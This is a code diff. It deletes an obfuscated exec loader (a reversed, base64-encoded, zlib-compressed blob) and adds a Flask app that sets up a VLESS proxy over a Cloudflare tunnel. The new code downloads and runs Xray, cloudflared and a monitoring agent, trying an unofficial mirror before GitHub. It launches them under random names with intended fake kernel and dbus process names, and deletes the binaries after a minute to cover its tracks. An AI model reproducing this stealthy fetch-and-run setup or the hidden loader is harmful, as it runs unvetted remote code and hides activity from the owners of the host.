@@ -1,2 +1,330 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'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'))
+import os
+import json
+import time
+import base64
+import random
+import string
+import zipfile
+import threading
+import subprocess
+import requests
+from flask import Flask, jsonify, Response
+
+FILE_PATH = os.getenv("FILE_PATH", "./tmp")
+SUB_PATH = os.getenv("SUB_PATH", "sub")
+PORT = int(os.getenv("PORT", 3000))
+
+UUID = os.getenv("UUID", "")
+ARGO_PORT = int(os.getenv("ARGO_PORT", 8001))
+ARGO_AUTH = os.getenv("ARGO_AUTH", "")
+ARGO_DOMAIN = os.getenv("ARGO_DOMAIN", "")
+
+CFIP = os.getenv("CFIP", "www.cloudflare.com")
+CFPORT = int(os.getenv("CFPORT", 443))
+NAME = os.getenv("NAME", "Argo-VLESS")
+
+KOMARI_ENDPOINT = os.getenv("KOMARI_ENDPOINT", "")
+KOMARI_TOKEN = os.getenv("KOMARI_TOKEN", "")
+
+STATE = {
+    "ready": False,
+    "sub": "",
+    "domain": "",
+    "error": ""
+}
+
+WS_PATH = os.getenv("WS_PATH") or "/" + "".join(
+    random.choice(string.ascii_lowercase + string.digits)
+    for _ in range(10)
+)
+
+
+def random_name(length=8):
+    chars = string.ascii_lowercase + string.digits
+    return "".join(random.choice(chars) for _ in range(length))
+
+
+def ensure_dir(path):
+    os.makedirs(path, exist_ok=True)
+
+
+def get_arch():
+    return "arm" if "arm" in os.uname().machine.lower() else "amd"
+
+
+def random_ua():
+    return random.choice([
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "Mozilla/5.0 (X11; Linux x86_64)",
+        "curl/7.88.1"
+    ])
+
+
+def spawn_detached(cmd, fake_name=None):
+    try:
+        subprocess.Popen(
+            cmd,
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            start_new_session=True,
+            executable=cmd[0]
+        )
+    except Exception:
+        subprocess.Popen(
+            cmd,
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            start_new_session=True
+        )
+
+
+def delayed_cleanup(files, delay=60):
+    def worker():
+        time.sleep(delay)
+        for f in files:
+            try:
+                if os.path.exists(f):
+                    os.remove(f)
+            except Exception:
+                pass
+
+    threading.Thread(target=worker, daemon=True).start()
+
+
+def download_file(url, dest):
+    r = requests.get(
+        url,
+        stream=True,
+        timeout=15,
+        headers={"User-Agent": random_ua()}
+    )
+    r.raise_for_status()
+
+    with open(dest, "wb") as f:
+        for chunk in r.iter_content(8192):
+            if chunk:
+                f.write(chunk)
+
+
+def download_with_fallback(urls, dest):
+    last_error = None
+
+    for url in urls:
+        try:
+            download_file(url, dest)
+            return
+        except Exception as e:
+            last_error = e
+            try:
+                os.remove(dest)
+            except Exception:
+                pass
+
+    raise RuntimeError(str(last_error))
+
+
+def download_xray(path):
+    if os.path.exists(path):
+        return
+
+    name = (
+        "xray-linux-arm64-v8a"
+        if get_arch() == "arm"
+        else "xray-linux-64"
+    )
+
+    zip_path = path + ".zip"
+
+    download_with_fallback([
+        f"https://download.lycn.qzz.io/{name}",
+        f"https://github.com/XTLS/Xray-core/releases/latest/download/{name}.zip"
+    ], zip_path)
+
+    with zipfile.ZipFile(zip_path) as z:
+        z.extract("xray", FILE_PATH)
+
+    os.rename(os.path.join(FILE_PATH, "xray"), path)
+    os.chmod(path, 0o755)
+    os.remove(zip_path)
+
+
+def download_cloudflared(path):
+    if os.path.exists(path):
+        return
+
+    name = (
+        "cloudflared-linux-arm64"
+        if get_arch() == "arm"
+        else "cloudflared-linux-amd64"
+    )
+
+    download_with_fallback([
+        f"https://download.lycn.qzz.io/{name}",
+        f"https://github.com/cloudflare/cloudflared/releases/latest/download/{name}"
+    ], path)
+
+    os.chmod(path, 0o755)
+
+
+def download_komari(path):
+    if os.path.exists(path):
+        return
+
+    name = (
+        "komari-agent-linux-arm64"
+        if get_arch() == "arm"
+        else "komari-agent-linux-amd64"
+    )
+
+    download_with_fallback([
+        f"https://download.lycn.qzz.io/{name}",
+        f"https://github.com/komari-monitor/komari-agent/releases/latest/download/{name}"
+    ], path)
+
+    os.chmod(path, 0o755)
+
+
+def start_komari(bin_path):
+    if not (KOMARI_ENDPOINT and KOMARI_TOKEN):
+        return
+
+    spawn_detached([
+        bin_path,
+        "-e", KOMARI_ENDPOINT,
+        "-t", KOMARI_TOKEN
+    ])
+
+
+def write_xray_config(config_path):
+    config = {
+        "log": {
+            "loglevel": "warning"
+        },
+        "inbounds": [{
+            "listen": "127.0.0.1",
+            "port": ARGO_PORT,
+            "protocol": "vless",
+            "settings": {
+                "clients": [{"id": UUID}],
+                "decryption": "none"
+            },
+            "streamSettings": {
+                "network": "ws",
+                "security": "none",
+                "wsSettings": {
+                    "path": WS_PATH
+                }
+            }
+        }],
+        "outbounds": [{
+            "protocol": "freedom"
+        }]
+    }
+
+    with open(config_path, "w") as f:
+        json.dump(config, f, indent=2)
+
+
+def build_sub(domain):
+    url = (
+        f"vless://{UUID}@{CFIP}:{CFPORT}"
+        f"?encryption=none"
+        f"&security=tls"
+        f"&type=ws"
+        f"&host={domain}"
+        f"&path={WS_PATH}"
+        f"#{NAME}"
+    )
+
+    return base64.b64encode(url.encode()).decode()
+
+
+def startup():
+    try:
+        if not UUID:
+            raise RuntimeError("UUID required")
+
+        if not ARGO_AUTH:
+            raise RuntimeError("ARGO_AUTH required")
+
+        if not ARGO_DOMAIN:
+            raise RuntimeError("ARGO_DOMAIN required")
+
+        ensure_dir(FILE_PATH)
+
+        xray = os.path.join(FILE_PATH, random_name())
+        cloudflared = os.path.join(FILE_PATH, random_name())
+        komari = os.path.join(FILE_PATH, random_name())
+
+        config = os.path.join(FILE_PATH, "config.json")
+
+        download_xray(xray)
+        download_cloudflared(cloudflared)
+
+        if KOMARI_ENDPOINT and KOMARI_TOKEN:
+            download_komari(komari)
+
+        write_xray_config(config)
+
+        spawn_detached(
+            [xray, "run", "-c", config],
+            "[kworker/u8:2]"
+        )
+
+        time.sleep(2)
+
+        spawn_detached(
+            [
+                cloudflared,
+                "tunnel",
+                "--no-autoupdate",
+                "run",
+                "--token",
+                ARGO_AUTH
+            ],
+            "[dbus-daemon]"
+        )
+
+        if KOMARI_ENDPOINT and KOMARI_TOKEN:
+            start_komari(komari)
+
+        delayed_cleanup(
+            [xray, cloudflared, komari, config],
+            60
+        )
+
+        STATE["ready"] = True
+        STATE["domain"] = ARGO_DOMAIN
+        STATE["sub"] = build_sub(ARGO_DOMAIN)
+
+    except Exception as e:
+        STATE["error"] = str(e)
+
+
+threading.Thread(target=startup, daemon=True).start()
+
+app = Flask(__name__)
+
+
+@app.route("/")
+def index():
+    return "VLESS Argo Service Running"
+
+
+@app.route("/health")
+def health():
+    return jsonify(STATE)
+
+
+@app.route(f"/{SUB_PATH}")
+def sub():
+    if not STATE["ready"]:
+        return Response("Not ready", status=503)
+
+    return Response(STATE["sub"], mimetype="text/plain")
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=PORT)
